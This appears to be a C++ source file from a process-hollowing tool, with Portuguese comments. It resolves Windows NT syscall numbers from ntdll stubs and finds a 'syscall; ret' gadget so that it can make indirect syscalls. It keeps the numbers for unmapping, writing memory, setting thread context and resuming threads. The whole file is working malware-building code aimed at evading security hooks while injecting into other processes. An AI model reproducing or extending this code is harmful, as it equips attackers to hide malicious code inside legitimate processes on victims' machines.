#include "../include/SyscallResolver.h"
#include "../include/PEBWalker.h"

// Definicao das globais (lidas pelos stubs em syscalls.asm)
extern "C" {
    ULONG g_NtAllocateVirtualMemory_num = 0;
    ULONG g_NtWriteVirtualMemory_num    = 0;
    ULONG g_NtReadVirtualMemory_num     = 0;
    ULONG g_NtSetContextThread_num      = 0;
    ULONG g_NtGetContextThread_num      = 0;
    ULONG g_NtResumeThread_num          = 0;
    ULONG g_NtUnmapViewOfSection_num    = 0;
    ULONG g_NtCreateFile_num            = 0;
    ULONG g_NtReadFile_num              = 0;
    ULONG g_NtClose_num                 = 0;
    PVOID g_syscall_gadget              = nullptr;
}

namespace Hollowing {

    DWORD SyscallResolver::ExtractSyscallNumber(PVOID funcPtr) {
        if (!funcPtr) return 0;
        PBYTE code = (PBYTE)funcPtr;

        if (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8) {
            return *(PDWORD)(code + 4);
        }
        for (int i = 0; i < 32; i++) {
            if (code[i] == 0xB8) return *(PDWORD)(code + i + 1);
        }
        return 0;
    }

    PVOID SyscallResolver::FindSyscallGadget(PVOID ntdllBase) {
        if (!ntdllBase) return nullptr;

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdllBase;
        PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + dos->e_lfanew);

        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
            if (memcmp(section->Name, ".text", 5) != 0) continue;
            PBYTE base = (PBYTE)ntdllBase + section->VirtualAddress;
            DWORD size = section->Misc.VirtualSize;
            for (DWORD off = 0; off + 3 <= size; off++) {
                if (base[off] == 0x0F && base[off+1] == 0x05 && base[off+2] == 0xC3) {
                    return base + off;
                }
            }
            break;
        }
        return nullptr;
    }

    bool SyscallResolver::ResolveAll() {
        PVOID ntdll = MyGetModuleHandle(L"ntdll.dll");
        if (!ntdll) return false;

        struct { const char* name; ULONG* out; } table[] = {
            { "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemory_num },
            { "NtWriteVirtualMemory",    &g_NtWriteVirtualMemory_num    },
            { "NtReadVirtualMemory",     &g_NtReadVirtualMemory_num     },
            { "NtSetContextThread",      &g_NtSetContextThread_num      },
            { "NtGetContextThread",      &g_NtGetContextThread_num      },
            { "NtResumeThread",          &g_NtResumeThread_num          },
            { "NtUnmapViewOfSection",    &g_NtUnmapViewOfSection_num    },
            { "NtCreateFile",            &g_NtCreateFile_num            },
            { "NtReadFile",              &g_NtReadFile_num              },
            { "NtClose",                 &g_NtClose_num                 },
        };

        for (auto& e : table) {
            PVOID fn = MyGetProcAddress(ntdll, e.name);
            DWORD num = ExtractSyscallNumber(fn);
            if (num == 0) return false;
            *e.out = num;
        }

        g_syscall_gadget = FindSyscallGadget(ntdll);
        return g_syscall_gadget != nullptr;
    }

}
